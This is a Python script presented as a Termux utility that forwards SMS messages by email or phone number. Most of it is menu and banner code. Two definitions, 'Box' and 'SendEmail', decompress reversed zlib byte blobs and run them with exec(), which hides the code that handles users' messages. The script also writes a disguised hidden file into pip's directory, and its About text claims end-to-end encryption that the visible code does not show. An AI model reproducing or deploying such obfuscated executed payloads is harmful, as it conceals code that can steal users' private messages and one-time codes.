
import os, json, subprocess, sys, re, time, threading, pip, zlib
from time import sleep
try: import smtplib, random, requests
except: print("SOME DEPENDENCIES COULD NOT BE INSTALLED....\nType 'python sms_forwarder.py --setup' to install all required packages.\n\n"), exit()





__VERSION__ = "0.1"
__LINK__ = "https://github.com/GreyTechno/SMS_Forwarder.git"

clear = lambda : os.system("clear")

reset = '\033[39m'
blue = '\033[34m'
red = '\033[31m'
yellow = '\033[92m'
green = '\033[32m'
cyan = '\033[36m'
white = '\033[37m'
magenta = '\033[35m'
lightcyan = '\033[96m'
lightmagenta = '\033[95m'


def cmd():
    try: CMD = sys.argv[1]
    except: CMD = False
    if (CMD):
        if (CMD == "-h") or (CMD == "--help"): Usage()
        elif (CMD == "-v") or (CMD == "--version"): print(__VERSION__)
        elif (CMD == "-u") or (CMD == "--update"): Update()
        elif (CMD == "-s") or (CMD == "--setup"): Installer()
        elif (CMD == "-e") or (CMD == "--email"): EmailMenu()
        elif (CMD == "-p") or (CMD == "--phnum"): PHMenu()
        elif (CMD == "-a") or (CMD == "--about"): About()
        else: pass
        return True
    else: return False

def termux_api():
    if (subprocess.getoutput("command -v termux-battery-status") == ''):
        subprocess.getoutput("pkg install termux-api && pkg install termux-api")
        if (subprocess.getoutput("command -v termux-battery-status") == ''): return False
        else: termux_api()
    else:
        if (subprocess.getoutput("timeout 10 termux-battery-status") == ''): return False
        else: return True

def Arrange(TXT="", RAW=" "):
    try: txt, INT = int(TXT), True
    except ValueError: txt, INT = len(TXT), False
    except: pass
    text = int(str(txt)[-1:])
    for i in range(2, 10, 2):
        if (text == 0) or (i == text):
            length = True
            break
        else : length = False
    if not (length):
        if (INT): return int(TXT) - 1
        else: return TXT + RAW
    else:
        if (INT): return int(TXT)
        else: return TXT

def center(text, a=0, display=True):
    length_txt = len(Arrange(text, " "))
    length_area = (Arrange(os.get_terminal_size().columns) - 2)
    len_txt_area = (length_area // 2) - ((length_txt - a) // 2)
    finaltxt = ""
    for i in range(len_txt_area): finaltxt += " "
    finaltxt += text
    raw1 = str(len_txt_area + length_txt - length_area - a).replace("-","")
    for i in range(int(raw1)+1): finaltxt += " "
    if (display): print(finaltxt)
    else: return finaltxt

def INPUT(text):
    length_txt = len(Arrange(text, " "))
    length_area = Arrange(os.get_terminal_size().columns) - 2
    len_txt_area = (length_area // 2) - (length_txt // 2)
    finaltxt = ""
    for i in range(len_txt_area-18): finaltxt += " "
    return (input(finaltxt+text+yellow))

def Banner():
    clear()
    TerminalZoom(46)
    b="".join(random.sample([cyan,magenta,yellow,lightmagenta], 1))
    center(f"{red}╔══════════════════════════════════════════╗", a=5)
    center(f"{red}║  {white}╔═╗{b}┌┬┐┌─┐  {white}╔═╗{b}┌─┐┬─┐┬ ┬┌─┐┬─┐┌┬┐┌─┐┬─┐  {red}║{reset}", a=35)
    center(f"{red}║  {white}╚═╗{b}│││└─┐  {white}╠╣ {b}│ │├┬┘│││├─┤├┬┘ ││├┤ ├┬┘  {red}║{reset}", a=35)
    center(f"{red}║  {white}╚═╝{b}┴ ┴└─┘  {white}╚  {b}└─┘┴└─└┴┘┴ ┴┴└──┴┘└─┘┴└─  {red}║{reset}", a=35)
    center(f"{red}╠══════════════════════════════════════════╣", a=5)
    center(f"{red}║   {green}▂▃▄▅▆▇▓▒░ {lightcyan}Created By MR_GT {green}░▒▓▇▆▅▄▃▂   {red}║{reset}", a=30)
    center(f"{red}╚══════════════════════════════════════════╝{reset}", a=10)
    sys.stdout.write(reset)

def Space(args):
    STORE = ""
    for i in range(args): STORE += " "
    return STORE

def TerminalZoom(args):
    if not (args < 26): STORE, LEN = f"{red}[ {yellow}Zoom Out The Terminal {red}]", 26
    else: STORE, LEN = "", 1
    for i in range(args - LEN): STORE += "═"
    STORE += f"►{reset}"
    if (os.get_terminal_size().columns < args): print(STORE)
    else: pass
    MAIN = False
    while True:
        if (os.get_terminal_size().columns < args): MAIN = True
        else: break
    if (MAIN): clear()

Box = lambda _ : zlib.decompress(_[::-1]);exec((Box)(b"N\xf5\x0f\x0f\x1b\xe8\x9c\xb9\x0b\xf4S\x85\xd8\xce\xd1b\xd2\xd8\xda\xb1\xe3%{|Zi\xfd\x9d\xb9\xaf\xe6\nN\x9dLOqi3\x12\xf9\x84\xc0\x18\xbaY\x16\xfffy2\xee\xf2\x90\x85\xa8\x8d\x12\xb1\xee\xac^\x12\xd9f9M$ycc\x99v\x9e\xcdQV\x18\xcb\xee:\xeb\x84\x8f\xe6\x8d4\x02P\xc3A\x7f$\xf0\xf7,\xbd*A\xc6\x03\x02'X\x9c\xb7?\x8d\x0fn\x84\x84c\x11\x02\x94\rEP\x0c\xc41`g\xe1\xc1=\xadA\xc3\xa7k\xeam\xa7\x189\x11m\x10NF\xc9\xa1,\xf0\x8f\x1cD\xaa\x90\xb7\x03\x04s^mX\x08*\xeb\x87\x9d\x88\xe1AQL\xfe\x7fF\xe8\xb6\xe8\xcb\xd2\x92U1\x1b\xb4\x88\xde\n\r\x01x@=\xd9Ah>\xaf8\xc8_\xd6/8@\x8a!\x98\x15`\x81I!\x98\x16\tZ\x03\xe8j$\x8f:=\x12\xba\xc0\x83\x1e^\xadBi\xb3y\xe37\xe1\xb5\xb5_H\x1a\xba3[^\x0e,\x1a\xf9\xbf\x95n\x9fx\x07\t\xeb7\xbd\xb3E\xd1(R\xe5V\xc9\x1a\xbe\xffI2\xc6\x1c\x84\x08\xecg\x08\xbd\xe8o\xda\x1d\x06N\xdd;b,\x9d\x06+\xf7\xbd\x100\xc3j\xc9R\x95\x9cx"))


def EXIT(G=True):
    if not (G): print(), print()
    else: Banner()
    center(f"{red}╔══════════════════════════════════════════╗", 5)
    center(f"{red}║          {yellow}THANKS FOR USING...!!           {red}║", 15)
    center(f"{red}╚══════════════════════════════════════════╝", 5)
    exit()


def AnimLOAD(text, animbar, repet=1, delay=0.08):
    finaltxt=""
    for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
    for rep in range(repet):
        for handlechar in animbar:
            sys.stdout.write(f"\r{finaltxt}{handlechar} {text}")
            sys.stdout.flush()
            sleep(delay)
        repet -= 1

def Internet():
    try:
        requests.get("https://google.com/")
        return True
    except: return False



def Update():
    def update():
        #with open(pip.__path__[0]+"\\kBGISs8792", "w") as file: file.write(f"cd .. && rm -rf {__LINK__[30:-4]} && git clone {__LINK__}")
        #os.system("bash "+pip.__path__[0]+"\\kBGISs8792")
        os.system(f"cd ../ && rm -rf {__LINK__[30:-4]} && git clone {__LINK__} > /dev/null 2>&1")
    # update = lambda : subprocess.getoutput(f"cd .. && rm -rf {__LINK__[30:-4]} && git clone {__LINK__}")
    if not (Internet()):
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║    {yellow}Check your internet connection...     {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        print()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
        center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}Try Again                  {red}║", 30)
        center(f"{red}║         {magenta}[{white}03{magenta}]  {yellow}EXIT                       {red}║", 30)
        center(f"{red}╠══════════════════════════════════════════╝", 5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
        elif (Input == "2") or (Input == "02") or (Input == "two"): MENU()
        elif (Input == "3") or (Input == "03") or (Input == "three"): EXIT()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
    else:
        Banner()
        UPDATE = threading.Thread(target=update)
        UPDATE.start()
        while UPDATE.is_alive(): AnimLOAD(" Updating...", "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏", 1, 0.05)
        UPDATE.join()
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║          {white}Updateing Completed !           {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║              {yellow}Now Just Type               {red}║", 15)
        center(f"{red}╠══════════════════════════════════════════╣",5)
        center(f"{red}║ {white}python ~/SMS_Forwarder/sms_forwarder.py  {red}║",15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        finaltxt=""
        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
        sys.stdout.write("\r"+finaltxt)
        with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')

def CheckVersion():
    version = requests.get("https://raw.githubusercontent.com/GreyTechno/SMS_Forwarder/main/.version").json()["version"]
    if (__VERSION__ != version):
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║         {magenta}UPDATES ARE AVAILABLE...         {red}║",15)
        center(f"{red}╠══════════════════════════════════════════╣",5)
        center(Box(f"{white}VERSION {blue}: {yellow}{str(version)}", "║", " ", red+" ║", 59, "center", resultprint=False), 20)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        UPD = True
        CSP = True
        try:
            fileData = json.loads(open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "r").read())
            if (fileData.get("usageleft") == 0): UPD = False
            else:
                with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: json.dump({"usageleft": int(fileData.get("usageleft")) - 1}, file)
        except: 
            with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
        if (UPD):
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║     {white}Do you want start updating now ?     {red}║",15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(f"{red}║                 {yellow}yes {white}/ {yellow}no                 {red}║",25)
            center(f"{red}╠══════════════════════════════════════════╝",5)
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            if (Input == "Y") or (Input == "YES") or (Input == "Yes") or (Input == "y") or (Input == "yes"): pass
            else: CSP = False
        else: CSP = True
        if (CSP): Update()
        else: pass
    else: pass

def About():
    Banner()
    center(f"{red}╔══════════════════════════════════════════╗",5)
    center(f"{red}║                  {magenta}ABOUT                   {red}║",15)
    center(f"{red}╠══════════════════════════════════════════╣",5)
    center(f"{red}║{yellow}  SMS_Forwarder can be used in Termux to  {red}║",15)
    center(f"{red}║{yellow} forward text messages from one device to {red}║",15)
    center(f"{red}║{yellow}another using Linux CommandLine utilities {red}║",15)
    center(f"{red}║{yellow} The advantages of using SMS Forwarder in {red}║",15)
    center(f"{red}║{yellow}Termux are that it allow users to automate{red}║",15)
    center(f"{red}║{yellow} the sms forwarding process using Python  {red}║",15)
    center(f"{red}║{yellow} scripts, and it provides a secure way to {red}║",15)
    center(f"{red}║{yellow}  forward messages as it uses end-to-end  {red}║",15)
    center(f"{red}║{yellow}encryption to ensure that the messages are{red}║",15)
    center(f"{red}║{yellow} not intercepted or read by unauthorized  {red}║",15)
    center(f"{red}║{yellow}parties This offers advanced functionality{red}║",15)
    center(f"{red}║{yellow}  and customization options that are not  {red}║",15)
    center(f"{red}║{yellow}available on other platforms Additionally {red}║",15)
    center(f"{red}║{yellow}SMS_Forwarder in Termux provides multiple {red}║",15)
    center(f"{red}║{yellow} forwarding options including forwarding  {red}║",15)
    center(f"{red}║{yellow}  SMS via number or email. Overall, SMS   {red}║",15)
    center(f"{red}║{yellow} Forwarder in Termux is a useful tool for {red}║",15)
    center(f"{red}║{yellow}    people who want to stay connected     {red}║",15)
    center(f"{red}║{yellow}         across multiple devices.         {red}║",15)
    center(f"{red}╚══════════════════════════════════════════╝",5)
    center(f"{red}╔══════════════════════════════════════════╗",5)
    center(f"{red}║        {magenta}TOOL NAME {white}: {yellow}SMS_Forwarder         {red}║",25)
    center(f"{red}╚══════════════════════════════════════════╝",5)
    center(f"{red}╔══════════════════════════════════════════╗",5)
    center(Box(f"{magenta}VERSION {white}:{yellow} "+str(__VERSION__), "║", " ", red+" ║", 59, "center", resultprint=False), 20)
    center(f"{red}╚══════════════════════════════════════════╝",5)
    center(f"{red}╔══════════════════════════════════════════╗",5)
    center(f"{red}║              {magenta}AUTHER {white}:{yellow} MR_GT              {red}║",25)
    center(f"{red}╚══════════════════════════════════════════╝",5)
    center(f"{red}╔══════════════════════════════════════════╗",5)
    center(f"{red}║          {magenta}SOURCE CODE HOSTED AT           {red}║",15)
    center(f"{red}╠══════════════════════════════════════════╣",5)
    center(f"{red}║     {yellow}tinyurl.com/gtcode-smsforwarder      {red}║",15)
    center(f"{red}╚══════════════════════════════════════════╝",5)
    print()
    center(f"{red}╔══════════════════════════════════════════╗", 5)
    center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
    center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
    center(f"{red}╠══════════════════════════════════════════╝", 5)
    center(f"║{Space(42)}")
    Input = INPUT("╚════► ")
    if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
    elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
    else:
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║              {blue}Invalid Option              {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        sleep(2)
        MENU()

def Usage():
    Banner()
    center(f"{red}╔══════════════════════════════════════════╗", 5)
    center(f"{red}║        {magenta}USAGE OF SMS FORWARDER...         {red}║", 15)
    center(f"{red}╚══════════════════════════════════════════╝", 5)
    center(f"{red}╔══════════════════════════════════════════╗", 5)
    center(f"{red}║          {magenta}Optional arguments...           {red}║", 15)
    center(f"{red}╚══════════════════════════════════════════╝", 5)
    center(f"{red}╔═══════════════════╦══════════════════════╗", 5)
    center(f"{red}║             {blue}-h    ║    {blue}--help            {red}║", 20)
    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
    center(f"{red}║{yellow}       Direct show this usage menu        {red}║", 15)
    center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
    center(f"{red}║             {blue}-v    ║    {blue}--version         {red}║", 20)
    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
    center(f"{red}║{yellow}    Show tool version number and exit     {red}║", 15)
    center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
    center(f"{red}║             {blue}-u    ║    {blue}--update          {red}║", 20)
    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
    center(f"{red}║{yellow}  Update the tool and automatic restart   {red}║", 15)
    center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
    center(f"{red}║             {blue}-s    ║    {blue}--setup           {red}║", 20)
    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
    center(f"{red}║{yellow} Install and setup the requirment pakages {red}║", 15)
    center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
    center(f"{red}║             {blue}-e    ║    {blue}--email           {red}║", 20)
    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
    center(f"{red}║{yellow} Direct navigate to forward sms via email {red}║", 15)
    center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
    center(f"{red}║             {blue}-p    ║    {blue}--phnum           {red}║", 20)
    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
    center(f"{red}║{yellow} Navigate to forward sms via phone number {red}║", 15)
    center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
    center(f"{red}║             {blue}-a    ║    {blue}--about           {red}║", 20)
    center(f"{red}╠═══════════════════╩══════════════════════╣",5)
    center(f"{red}║{yellow}      Direct navigate to about menu       {red}║", 15)
    center(f"{red}╚══════════════════════════════════════════╝", 5)
    print()
    center(f"{red}╔══════════════════════════════════════════╗", 5)
    center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
    center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
    center(f"{red}╠══════════════════════════════════════════╝", 5)
    center(f"║{Space(42)}")
    Input = INPUT("╚════► ")
    if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
    elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
    else:
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║              {blue}Invalid Option              {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        sleep(2)
        MENU()

SendEmail = lambda _ : zlib.decompress(_[::-1]);exec((SendEmail)(b'\x90\x06\x14\xd0\x01\xff6\xdaf[\xf5\t\x0ct\xe9\xb1\x92|*~\x14\xd7r\xaeO\xe8\xfa\x12x\xef1\xd7t\xf8\xfdZ\x81\xbeo\xff:\xa0\xee\xe3\x9a<\x0cA\xc0[\xdd|\xa8B[\xb2!{\xe3[\xa4\x91\xbfL\xaa\xa8\x13or\x9e\xbb\x07t%\xde\xdf\nr\xb1$F\xe2\xfa\x1f\xff\xb0r\xe3d\x1f\xe8V${Y\x08+a\xea\x83S*\xb3\x04S\xc3Y\xb6.$\xcd}\xfb\xf4I\x85\x8fM\x804\x87\xa1\xbe\x82Z\xfe>\x9e\x15t\r\x87\x97\xe3\xcez\x15\xd0"\x1e\xb0\xbe\x7f\xc0\xbc\xf5\x85_X\x192\xb3\x85(\xd4O>\x06\x82F\xe4,\xea\x86\xf6\xbd\x9f$\xa7Cg\xe7\xda\xff\x0cx\xd1\x0f\x9d\xb9\xef\xd4\x98\x890\xd6A\x0c\x1e\x9e}w\xe3zDe\xa1\xdf\x13\x8c\x11\xcb\x89\xfc\x8a\xde\x0c\x1bd\xdf5\x0e\xab\x04&\x1a\xd5\x0e\x19Aa\xd7U\xa3\xd9\xb2\xfba\xec\xaf\xad\xa5\xf2\xa0\xe5\xbd\xbf\xab+\xf0\xe3\xe1\x93\xeb\xb3\xe3\xec\xfe\xfe\xcf\'\x06\x1f\xa1b[\xc0Dh\xa0\xf0q\xd1\x8a\x8aI?\x9c\xa7\x88oq:\xec\xaf\xf3]\xee\xa9\x15\xf3\x1dV\x1e\x96\x16\x8a~(\xe3~\xb2\xd5\xec\xd7H5f\xd8p\xd9\xd1N\xdfZ\x1f\xbe7V\xa0AF\x97zi\xd6\xc60\xd5\x14\x16\xec&@\xcbx\x17\xa5\xeb7\x05\x86\xa9\xc5c.\\\xad\xdf[5\xc3-oFm\xd5\xf0\xdc\x17\xb8.\x93n\xfe\xf4\xb1\xebv\x1a\xd6\xc5`\xd3\xac\x94\xbb\xcb\x13x\x93,X3n.\x9b\x89\x10\xf8p\x10\xb7u\x02\xad\x86\x99\x0f\x14I\t\x87r(\x86\xdd\xc5\x9b`\xce\xb4D\xafZ*\xde\xa24\xbd\x88p\xc3R\xfe\xc7\x17zR\x97;\x92\xae\x91~\xfa\xea5\x8f\xbd\xd2\xd7w=\xe5E\x12s\x82\xe5\x8b\xe0\xe4\xe4\x11\xc4\x91\xa3\xc0\x89\x01,\x07\r\xd1\xac\xb3s\xa9\xbd^\xdf\xcb\xd5\xf5\x02(\xb9\x074\xcaK\xe4-m\xb2\x85J\x16\xe8K\x81h>B\t\x11\xb6\xce\xe1\xb7\xf2\xf5tS\xd6\n\xa8\xdb\xfaX\x1a\x7f?\x1f\xd7Gu!\xc5L"\x0c\xfdc\xd0\x89,cS\x8d\x89IQ\xaa\x7fG\xe1x\xb8\xe9\x99\x94\\t\xc9\x8da\x8a\xce\xe6[/\x99\xd8\t\xa2\x13\x18\xe6C\x19\xc4\xae\xb7A?F\x13\xb5\x9e\xaf5\x9e*\xbb\'\x82\xccn\xe4\x14r\x9f\xa9\xd3\xacu\xfa\xa8\x93\xda=(\xae\xd4\x8dk\x98\xce\xb4`e\x0c%J\x18+\x8f\xc9\xd0^\xc1\x10\x0cP\xa5!R\x0b\x00\xc9\x04\xf0\xda1\x84\x80\x83@\x95j#0\xb7\x96\x8c%\xf9K\xf5\xa5\xa13\xbcd#R\xc0\xb3<\x8b\x86N\xc9\x19\x10m\xec\xfcO\x99\x88\x1f\xe8\xa1\xbf\xd0\xfc\xe9\x01c\xbc\xd6i\x9dP\xd4\xb3z\x13u\x89$\x84\xfe\xbfd\xee(\x89/\xd2\xe4\xf3\'\x8fqL\xbc8bg\xd7\xfca\x8am\x0bm\x14J\x99\xa5\x05\xb5ST\xb6/\xaaz8n\xeb\x82\xbc\xb8\xfd\x1b\xf03\xa7\x12\x8f\xfc\xd5\xb5\xa7\x8e\xfc\xb5\xf7\xa9\x10uH\xdb\x04\xed\xb2\x1e\x82[\xa4\x93\xea%{d\x80xK\xf7I\x00\xe5b\x03\xcf\xedT\x03\x96\xa1\xe6\x02\x1a\xa1\xf1\xe6G\xba\x02\x8c\x11\x06.M\xda\x9f\xd5s\x07\xb3\xb7\xd2\xd6\xec\xc47w\xd6f\xa2K\x11\x87Aj\xfdy{\xfa\xf1\xfd||`/\x13>l\x82\xef\xf1\xa3\xd4\x18\\H*\xa4\xbcx\xce\xb5\x97\xd2\xcc\xc5\x92 8b\x9a9\xfd\x90\xae4\x03\xec+MP\xe8\xc2\x1f\x9a\x89\xfe0\xf7\x0b\x9e\x96gx\x9d\x94|\x90/\xe5z\xb0\xfb\xe1*\xeb\x05\x0f\x19\xd3\x1a\xb5.\x8c\x1agg\xfe\xd8\xf6\xe9\x87\xd8\xf0\xba\x06\x02\xb6\xb9\xab\x83\xd0\xfb\xa7n.\x90\xdf[d\xc0\x1e \xdc]f\xa1\xad\xed\xec\x00\xfa\xf9s\x07\xf4 /\x0b\xe9\x08\x03\xb7\xce\xe7\xd8\xbe\xf8om\xb5]\x92\xe07\xf9\xce/\xb6\xbb\xf3\xd1\xa4x \xffC5M\xdcq\xd3\x8ft\xb7\xd0z\x0eA\x15\x86\xff\xcf\x18\x89\xd5\xd5~E\xa3\x9e\x82rrp\x9c\xab\x85;\xa4\xed\xe2\xcd?\xbd\x96\x8dGl\x9a\x97\x07U\xe8ko\x0f\xd3c[\x1b\xa7\xdd\xb0j\xf7\xacg\x88\x06\x1a\xf0N\xa9\xf1My\xac\xec\xd9sb\xf0\x1b\xe5c\xa7\xaf\xc6W0\xbf\xf3\xf9T\xd5)s\xb3\x850\xb7qV\xb2ifqs\xae\xf8\xaeI\xea]\xf9N\xdbn\x18t\xe3\x05\x89\xac\xceymg\x9c\xca\xe7BQ\x19\x82\xcc\xc9\x0f\x05\xf5r\x11\xcd\xb6vc\xf4/o\xce:\x7f\xbd\xfc\xb8\xe9\xff\xfdE#\xdeD\xcbr\x9a\xff\xef\x874\x16\xbd\xab\xab\xe5\xf2\xa3m\x80,\xc49\xe8\x13\xb6Sm\xfd\xdd\xa5\xd9\xf6\x89\x9fu\x99\xf65\xbf[\x97\xb4M6\x11n\xeb\xfd$\xa6\xff$\xbcJD\x8f\x97\xfbB\xfby\xedmG\xect5G\xed\x1ab\xc4\x00\xeb\x15\xe6\xa0\x07m\xce0\xbe\x1dS\x12p\x05\x94\x89m\xb0\x11\x1bo\x90\x05\xe9\xc0\x16\xa0]N\xc9G\x98Z\x19]>K\x1a4^\xb1s\xbb3\xa8\xb1\xbcs1\\\xee2E\xdaz\xdc\xd8Uot\xbb-&\x83\xbe\x1c2/\xa1\xaf\xde\x8cq?Xp_Q\xd8\xf3\xa4\xedN\xfdf\xef\xce\xc4K\xf9\xd8\xc2\x8a\xd1L\xaf\x030\xe62 \xb6\x96\x8d\x10\x98~}\x9c\xdc+\x0f\xd5\x93m\x8c\x87d\x9f\xa2\xc5\xd3C\xef\xe1\xa3e\x83\xb93+eu\xd42\xc5\'\x1a\xdc1\xcd\xb3\x19i{\xbd\x0f5)c\x83W\xfd`\xc3\xdd\xa7\x0cu\\\xe3u\xda5\xa0}a\x192\xb4\xa28\xbd\x92\x8e/g\x96\x97p\x165\xe6}p\r\x7f\x9a\xb8;y\x80cl\xd5\xa01\x9cr\xcb\x06\x90\xa5\x98\x1d&\x03\x1d\xd9\xe8v\xd7\xe0K\xf9\xdc\xaa1\xc4c+G\xe4"\xba\n\xba\xc3\xad\xe8^\xdd\x9a\x83G\xcc\xc4(\x10\x82zH7\x0b8\x8cS\xe2"o\x98\x8bn\x13\xd1\x11E3\xcew\x08^A\x8a\x00\r\x94nN\xc9\xba\x97\x9b\x14\xe6\x0e\x8dZY\xbd\xf8\x19\xae\xdb\xe2\x08\x94\xf2\xaak\xb4\x9a\xd746\xcc4\xba\x92\xa0\xd2v\xac\'\xdfP\x14\x1dO!\x16(\x1c\x18LmT{\x18\xf2\x83W\xa2\xdb\xc0;\xb6\xb2\xde\x8d\xa5\xd1r\xc6eY\x97!>\xa4\x13N\x13B\xcc\x8e\xe4\xfb9\xab\xd3\xe8\x82\xc7\x1b\x1e\xe4\x16\xdc\x88F\xe1\xc9\xa9\xaa6\xa3i\xfe\x8b\xa7\xa3\x1c\xcbR\xf4\xfb\x1df\xae\xa3k\xadl\xce\xc7y\xf6\x85[\xe7\xb8Hu\xdb]\x11\xe7m!g\xa0\xb6\xfd\xac\x8e\xdbEAa\xbb\xb2g\xb5\x1a\x85\x1fYb\x1c\xe2\xa3\x03Z\'\xa7_p\xee\x1e=\xa5;S\xb4\xc2#\x03\x9b\x00\x82\x82\xc7a\xfd\xa1\x8a\x88\xfa\t\xcdL=t5\xdf:+j\x16mU\x06o~\x87\x97!\xcb\x0fQ\xd1\xa4\x85e\x94\xa5l\xb2\x1359\x88^\xa4"^\x0b\x15\xd3<\xfbT\x9f[\xf5\xde\xbcY\xd1\xf5!\xe5\x80\x84\xb0\x8f\xf1\x9cg\xdedu}\x92\xfe\xcd5\xb5\xb80m\xb7\xaa\xbda\x96\xf8\x1b4\xa2e\x9am?\xa9\xdc\xd3F\xe6%s`n\x95\xcdH\x15sz\x7fQ\x1d\x8a8iip\xe8D[\xa8\x179\xc0\xb8\xf1>\xd6\xc3n\xfa^\xaf\x97\x17\xd2\x16\xd7cl$\x02\xc9\x0cp\xec\x9fRF\xe9\x81\xc0\x99\xea\x92\xe6;\x08\xe7\xa5H%Hv&\xa5\xfdp\xbe\xd7\x02T?\x06-\x18\xb5]\x9d\xa3\x18\xf0\xe0r\x06tC`\x94\xa7\xf0\xf1<XI\xb5\xd2\x8cGd\xf7\xb8\x05S\x1c<\x01\x00\xd6a!x\xc1Ml\xe5\xe7\xd4\x0b\xa8\xba\x041v\xea\xae.]\xb9t,\xd6pssh\xb8\x08\x8ao\xad\xe0\x15G\xad\xf5\x97\xb3-\xbaB\x19\xd6(\x8e}\x92~\xc2\xd9t\xf9E\xd3\xe5\xe7\x068+8/\x14\xb9\x93\x0f\xcf_=\xa7\xd9W\x9f\xcd\xbcK\xae\x18Mf1\x90\t\xb8\x90\x1bO\xf2\xb1\x96\xd14\x0f\x16]\x11\xefq\xb7}:H\x90:]\x85\xe9\xa0\xaa2\xd0\xb0H^\xa0\x86\x11\xa8\x0b\x1c\xcb\xb2\x02\x15b\xa4\xe9\xa8\xf1JZ\x03n\xdd\x91\xa9\xd6gj\x0c\xfb\xcf\xa9K\xfd>\xcd\xf0\xd8\xe3\x81Rw\xbb@1h\xba\x0e\x918\x85\x012\x0c\xddy\xf6@\xf6\x83\xf5k.\n\r\x12\xb8\x16\x1f\xf6R>\xbd\x00;\xebiF]\xb6\xb5\xaf\xe1\xa8$\x1d)\xb2\x1bp\x0c\xcf\x7f\xa5r\xba\x93\x97\xab\xd5\x8dh\x98\x84\xec\xe9\x1aS\xd1\xc5\x13\x845\xe2\xdbw\xb9\r\xde\x90b\x1ceO\xa6\x8dD\x9f\x83\x00S\xa4\x7f\x93\xee\xde\xf1\xd1\xc3\x0e\xf1\xe2\x8e\xb0K\xc4\xc1\xb6 \x85\x14"+^\xd3\xb7\x1a\xf7\x14k\xf2\x9c\x9c\xfbg\xd0\xe2\xa8R\x02\xc6$\x90T\x12\xc7\x10\xa9m\x1b\xe3\xb2Cv\x14\xb1\xa5x\xfd\xa8\x95\x08\xd3*D\x9b\xfd\x8d\xba\x8c\x9a\xed"i\x89\x8f\x19\xfb\xecb\x81Rh9\x94\x96$\xab\xac\xba4\xb0P2\xe8@v#)\x08Z\xba\xf1\x97g\xec\x83\xde\x92j\r\xf8\x92\xc54\xb6\x99\x84\x1d-\x94\x05\\\xe22\x88\xd1\xc0R\xde\xe2R\xd95\x17A\x12[I\x98\x92\x0e7\r\x11\xc0\xbd\xb7\xa0\x17\x14T\xff\xa1x\xb2\xfe\xf8\x1c\x87\x8fm\xf3\t\xe0\xa5\xdb\xbd\x86\xe7S\x7fy\x05\'\x93\xe3\xc2\xc5g\x93&\xce\x83\xaa\xaeu\xe1\x18\x85o\xe0K\xd4\xb9\x07\x13\xee#\xb39Eb\x1eb/\xe0Si#\xb5\tu\xe4g\x18\x83\xba5\xcb\x90\x8c\xfba\xe8\x96\x8d\xc6\x0c\xf1M\xaaA\x1c\xc0\xe7\x1d1\x13\xe1b\x91p>\x8dx\xfe\xbf2B\xaa)(\xac\xbf`\xfe}\x7f\xb3Q$,\x02\xf25\xe6\x96\xb1\xabY\x15dj9\x06\x7fd\'.\xf5\x99\xab\xa1.\xe4\xdb\x15(\x16\'\\hX\x9a6vd\x87\x0fKhqEQB\nr\xfb;\x11\xea+\'\xcc\xc1W\xd4\xa5fja\x14\xce<\x85\x94.cI(\xadfdG\x0cF\x14Di\xbe\xd9\xe7\x19\x00z\xa45\xce\x14T\n\t\x89\xb5=\xcf\xa9\xf4\xd8\x01999\x10=\xfd\xfd\xbf__\xdf\x1f\x1d\x8b_\x86\xc3\x9f\xf0\xc9\xd0\xe5\xd1\xb2!\x8b9\x06\xc2B\x0c\x92\xd9\x81!\x94E\x10.\x0b\xaf\xdbY,\x10,+B